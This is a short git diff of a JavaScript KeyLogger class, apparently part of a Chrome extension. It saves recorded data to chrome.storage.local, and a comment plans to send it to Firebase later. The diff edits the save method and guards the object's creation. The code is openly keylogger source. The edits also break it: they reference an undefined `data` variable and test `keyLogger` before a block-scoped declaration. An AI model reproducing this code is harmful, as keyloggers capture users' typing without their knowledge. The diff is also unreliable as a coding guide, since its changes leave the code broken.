@@ -33,9 +33,8 @@ class KeyLogger {
 
 	save() {
     if (this.shouldSave) {
-  		console.log('saving with', this.data)
-  		// testing with local storage for now, later we should use firebase to store this data
-      chrome.storage.local.set(this.data, () => { console.log("Saved", this.data); this.shouldSave = false; });
+    		// testing with local storage for now, later we should use firebase to store this data
+	      chrome.storage.local.set(data, () => { console.log("Saved", data); this.shouldSave = false; });
 	  }
 	}
 
@@ -47,10 +46,10 @@ class KeyLogger {
 		}
 	}
 }
-
+if(!keyLogger){
 	const keyLogger = new KeyLogger();
 	keyLogger.init();	
-
+}
 
 console.log('keyLogger', keyLogger)
 // module.exports = KeyLogger;
